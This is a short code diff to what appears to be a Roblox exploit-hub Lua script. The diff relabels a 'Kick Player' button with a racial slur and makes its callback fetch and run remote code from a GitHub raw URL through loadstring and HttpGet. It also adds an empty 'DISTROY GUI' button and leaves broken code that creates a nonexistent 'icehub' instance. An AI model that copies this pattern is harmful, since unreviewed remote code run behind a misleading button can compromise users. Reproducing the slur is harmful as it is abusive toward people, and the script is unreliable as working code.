@@ -487,16 +487,20 @@ local KickSystemSection = SettingsTab:CreateSection("Player Kick System")
 
 -- Kick Button
 local KickButton = KickSystemSection:CreateButton({
-    Name = "Kick Player",
+    Name = "NIGGA ITS NOT KICK",
     Callback = function()
-        -- Player kick logic
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Devkigz/v5/main/v5hub",true))(); 
 
     end,
 })
 
--- Create a ScreenGui (a container for GUI elements)
-local gui = Instance.new("ScreenGui")
-gui.Parent = game.Players.LocalPlayer.PlayerGui
+local ButtonICEHUB= MainTab:CreateButton({
+    Name = "DISTROY GUI",
+    Callback = function()
+        -- Toggle RedZHUB
+
+    end,
+})
 
 -- Create a TextButton (icehub)
 local button = Instance.new("icehub")
